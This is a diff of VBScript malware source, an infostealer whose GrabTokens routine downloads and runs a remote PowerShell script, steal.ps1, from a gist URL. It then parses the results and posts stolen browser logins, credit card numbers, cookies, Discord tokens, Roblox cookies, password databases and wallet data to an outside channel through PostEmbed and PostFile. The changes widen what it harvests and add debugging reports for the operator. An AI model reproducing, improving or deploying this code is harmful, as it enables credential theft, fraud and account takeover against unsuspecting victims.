@@ -91,9 +91,12 @@ End Sub
 Sub GrabTokens()
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    xh.Open "GET", "https://gist.githubusercontent.com/Lxg-cmd/485ae68f0ee7e755635e513e6dace111/raw/13f84a20cc881bee6cf38c987fd3f98f937221e2/steal.ps1", False
+    xh.Open "GET", "https://gist.githubusercontent.com/Lxg-cmd/5df7ed7f356aaf41adc78298855755bc/raw/1c91dd604cfe83c836340d379a3219d7101ea973/steal.ps1", False
     xh.Send
-    If xh.Status <> 200 Then Exit Sub
+    If xh.Status <> 200 Then
+        Call PostEmbed(":x: PS download failed", "HTTP " & xh.Status, 16711680)
+        Exit Sub
+    End If
     Dim pc: pc = xh.responseText
     If Len(pc) < 100 Then Exit Sub
     Set xh = Nothing
@@ -104,38 +107,63 @@ Sub GrabTokens()
     fso.DeleteFile psf, True
 
     Dim tf: tf = TmpFile("steal_result.txt")
-    If Not fso.FileExists(tf) Then Exit Sub
-    Dim raw: raw = ReadFile(tf)
-
-    If Len(raw) > 10 Then
-        Dim lines: lines = Split(raw, vbCrLf)
-        Dim l
-        For Each l In lines
-            If Len(l) > 10 Then
-                If Left(l, 8) = "DISCORD|" Then
-                    Dim p: p = Split(Mid(l, 9), "|")
-                    If UBound(p) >= 4 Then
-                        Dim info: info = "**User:** " & p(0) & vbCrLf
-                        If p(1) <> "" Then info = info & "**Email:** " & p(1) & vbCrLf
-                        If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
-                        If p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
-                        info = info & "**Token:** " & p(4)
-                        Call PostEmbed(":gift: Discord Token", info, 5793266)
-                    End If
-                End If
-                If Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
-                    Call PostEmbed(":cookie: Roblox Cookie", Mid(l, 8), 65280)
-                End If
-                If Left(l, 8) = "PASSWORD" Then
-                    Dim pw: pw = Split(l, "|")
-                    If UBound(pw) >= 4 Then
-                        Call PostEmbed(":key: Password DB", "Browser: " & pw(1) & " | Status: " & pw(2) & " | b64: " & Len(pw(4)) & " chars", 16776960)
-                        If Len(pw(4)) > 0 Then Call PostFile(pw(1) & "_logindata.b64", pw(4))
-                    End If
-                End If
-            End If
-        Next
+    If Not fso.FileExists(tf) Then
+        Call PostEmbed(":x: no result file", "PS wrote nothing to " & tf, 16711680)
+        Exit Sub
     End If
+    Dim raw: raw = ReadFile(tf)
+    If Len(raw) < 5 Then
+        Call PostEmbed(":x: empty result", "file exists but empty", 16711680)
+        Exit Sub
+    End If
+
+    Dim US: US = Chr(31)
+    Dim lines: lines = Split(raw, vbCrLf)
+    Dim first: first = Split(lines(0), US)
+    If first(0) <> "VER" Then
+        Call PostEmbed(":warning: VERSION MISMATCH", "First line tag = [" & first(0) & "]" & vbCrLf & "Expected VER " & Chr(34) & "3" & Chr(34) & vbCrLf & "Gist is serving the old script — update it.", 16711680)
+    End If
+
+    Dim l, f, tag
+    For Each l In lines
+        If Len(l) > 4 Then
+            f = Split(l, US)
+            tag = f(0)
+            If tag = "VER" Then Call PostEmbed(":white_check_mark: PS version", f(1), 3447003)
+            If tag = "DBG" Then Call PostEmbed(":bug: " & f(1), f(2), 9807270)
+            If tag = "STAT" And UBound(f) >= 5 Then
+                Call PostEmbed(":bar_chart: Summary", f(1) & " | " & f(2) & " | " & f(3) & " | " & f(4) & " | " & f(5) & vbCrLf & "PC: " & PC & " | " & USER, 3447003)
+            End If
+            If tag = "LOGIN" And UBound(f) >= 5 Then
+                Call PostEmbed(":globe_with_meridians: " & f(1) & " login", "Profile: " & f(2) & vbCrLf & "URL: " & f(3) & vbCrLf & "User: " & f(4) & vbCrLf & "Pass: " & f(5), 5793266)
+            End If
+            If tag = "CARD" And UBound(f) >= 4 Then
+                Call PostEmbed(":credit_card: " & f(1) & " card", "Name: " & f(2) & vbCrLf & "Exp: " & f(3) & vbCrLf & "Number: " & f(4), 16776960)
+            End If
+            If tag = "COOKIE" And UBound(f) >= 4 Then
+                Call PostEmbed(":cookie: Cookie — " & f(1) & " / " & f(2), f(3) & " = " & Left(f(4), 200), 65280)
+            End If
+            If tag = "DISCORD" And UBound(f) >= 5 Then
+                Dim di: di = "**User:** " & f(1) & vbCrLf
+                If f(2) <> "" Then di = di & "**Email:** " & f(2) & vbCrLf
+                If f(3) <> "" Then di = di & "**Phone:** " & f(3) & vbCrLf
+                If f(4) <> "0" Then di = di & "**ID:** " & f(4) & vbCrLf
+                di = di & "**Token:** " & f(5) & vbCrLf & "**PC:** " & PC
+                Call PostEmbed(":gift: Discord Token", di, 5793266)
+            End If
+            If (tag = "ROBLOX" Or tag = "ROBLOXMS") And UBound(f) >= 1 Then
+                Call PostEmbed(":cookie: " & tag, "Size: " & Len(f(1)) & " | PC: " & PC, 65280)
+                Call PostFile(tag & "_cookie.txt", f(1))
+            End If
+            If tag = "PASSWORD" And UBound(f) >= 4 Then
+                Call PostEmbed(":key: Password DB", f(1) & " | " & f(2) & " | " & f(3) & " | " & Len(f(4)) & " b64 chars", 16776960)
+                If f(2) = "RAW_DB" And Len(f(4)) > 0 Then Call PostFile(f(1) & "_" & f(3) & ".db.b64", f(4))
+            End If
+            If tag = "WALLET" And UBound(f) >= 3 Then
+                Call PostEmbed(":briefcase: Wallet", f(1) & " — " & f(2) & " — " & f(3), 65280)
+            End If
+        End If
+    Next
     fso.DeleteFile tf, True
 End Sub
 
